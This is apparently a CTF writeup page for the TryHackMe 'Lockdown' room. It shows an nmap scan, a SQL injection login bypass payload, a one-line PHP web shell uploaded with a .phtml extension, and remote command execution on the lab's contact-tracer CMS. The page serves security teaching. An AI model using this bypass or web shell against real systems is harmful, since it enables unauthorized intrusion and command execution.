@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lockdown | TryHackMe Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        /* Same CSS as your template */
+        :root {
+            --bg-color: #0a0a0a;
+            --card-bg: #111111;
+            --accent-blue: #00e5ff;
+            --text-main: #e0e0e0;
+            --text-dim: #999;
+            --border-color: #222;
+            --mono-font: 'JetBrains Mono', monospace;
+            --success: #00ff88;
+        }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            max-width: 1000px;
+            width: 90%;
+            padding: 4rem 0;
+        }
+        h1 { font-size: 3rem; background: linear-gradient(to right, #fff, #666); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        h2 { border-left: 3px solid var(--accent-blue); padding-left: 1rem; }
+        code { font-family: var(--mono-font); color: var(--accent-blue); background: rgba(0,229,255,0.1); padding: 0.2rem 0.4rem; border-radius: 4px; }
+        pre { background: var(--card-bg); border: 1px solid var(--border-color); padding: 1.5rem; border-radius: 8px; font-family: var(--mono-font); overflow-x: auto; }
+        .flag-box { background: linear-gradient(45deg, #001a1a, #000); border: 1px solid var(--success); padding: 1.5rem; text-align: center; border-radius: 4px; }
+        .flag-label { color: var(--success); font-family: var(--mono-font); font-size: 0.7rem; }
+        .flag-text { font-family: var(--mono-font); font-size: 1.2rem; color: #fff; }
+        .note { background: rgba(0,229,255,0.05); border-left: 3px solid var(--accent-blue); padding: 1rem; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 0.8rem; border-bottom: 1px solid var(--border-color); text-align: left; }
+        th { color: #fff; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <header>
+        <span class="category">Web Exploitation // CTF Writeup</span>
+        <h1>Lockdown</h1>
+        <p>TryHackMe Room - CTS-QR CMS Exploitation</p>
+    </header>
+
+    <section>
+        <div class="section-num">/ 01</div>
+        <h2>Reconnaissance</h2>
+        <h3>1.1 Port Scanning</h3>
+        <pre><code>nmap -sC -sV -p 22,80 10.48.190.0
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Coronavirus Contact Tracer</code></pre>
+        <p>The target runs an Ubuntu server with SSH and a web application called "Coronavirus Contact Tracer".</p>
+    </section>
+
+    <section>
+        <div class="section-num">/ 02</div>
+        <h2>Initial Access - SQL Injection</h2>
+        <h3>2.1 Admin Login Bypass</h3>
+        <p>The admin login page at <code>/admin/login.php</code> was vulnerable to SQL injection:</p>
+        <pre><code>Username: admin' -- -
+Password: anything</code></pre>
+        <div class="note">
+            <strong>Vulnerability:</strong> The application concatenates user input directly into SQL queries without sanitization. The payload <code>admin' -- -</code> comments out the password check.
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 03</div>
+        <h2>Enumeration</h2>
+        <h3>3.1 Admin Panel Features</h3>
+        <ul>
+            <li><strong>Individuals List</strong> - Add/edit people with photo upload</li>
+            <li><strong>Establishment List</strong> - Manage locations</li>
+            <li><strong>System Info</strong> - Update system logo</li>
+            <li><strong>User Profile</strong> - Update admin avatar</li>
+        </ul>
+        <h3>3.2 File Upload Attempts</h3>
+        <p>Multiple upload points were tested for PHP shell upload:</p>
+        <table>
+            <tr><th>Upload Point</th><th>Result</th></tr>
+            <tr><td>System Logo</td><td>Returns 200 OK, file saved as <code>uploads/TIMESTAMP_filename</code></td></tr>
+            <tr><td>Individual Photo</td><td>Returns 500 Error (PHP execution attempted)</td></tr>
+            <tr><td>User Avatar</td><td>Updates database but doesn't save file</td></tr>
+        </table>
+    </section>
+
+    <section>
+        <div class="section-num">/ 04</div>
+        <h2>Exploitation</h2>
+        <h3>4.1 Uploading a PHP Shell</h3>
+        <pre><code># Create PHP shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Upload via System Settings endpoint
+curl -X POST http://contacttracer.thm/classes/SystemSettings.php?f=update_settings \
+  -H "Cookie: PHPSESSID=[SESSION]" \
+  -F "img=@shell.php;filename=shell.phtml"</code></pre>
+        <h3>4.2 Locating the Uploaded Shell</h3>
+        <p>The uploaded file is accessible via the lockscreen page source:</p>
+        <pre><code>curl http://contacttracer.thm/ | grep "uploads/"</code></pre>
+        <h3>4.3 Command Execution</h3>
+        <pre><code>curl "http://contacttracer.thm/uploads/[TIMESTAMP]_shell.phtml?cmd=whoami"
+www-data</code></pre>
+    </section>
+
+    <section>
+        <div class="section-num">/ 05</div>
+        <h2>Flags</h2>
+        <div class="flag-box">
+            <span class="flag-label">USER FLAG</span>
+            <div class="flag-text">[Found in admin panel at /admin/?page=user]</div>
+        </div>
+        <div class="flag-box">
+            <span class="flag-label">ROOT FLAG</span>
+            <div class="flag-text">[Requires privilege escalation - check sudo -l]</div>
+        </div>
+    </section>
+
+    <section>
+        <div class="section-num">/ 06</div>
+        <h2>Key Takeaways</h2>
+        <ul>
+            <li><strong>SQL injection remains a critical vulnerability</strong> - A simple <code>' -- -</code> bypassed authentication entirely.</li>
+            <li><strong>Multiple upload points have different restrictions</strong> - The logo upload was less restrictive than the individual photo upload.</li>
+            <li><strong>Check page source for hidden paths</strong> - The uploaded shell filename was visible in the lockscreen HTML.</li>
+            <li><strong>PHP execution depends on directory</strong> - <code>/uploads/</code> didn't execute <code>.php</code> but <code>.phtml</code> worked.</li>
+        </ul>
+    </section>
+
+    <footer>
+        &copy; 2026 // CTF WRITEUP // LOCKDOWN ROOM
+    </footer>
+</div>
+</body>
+</html>
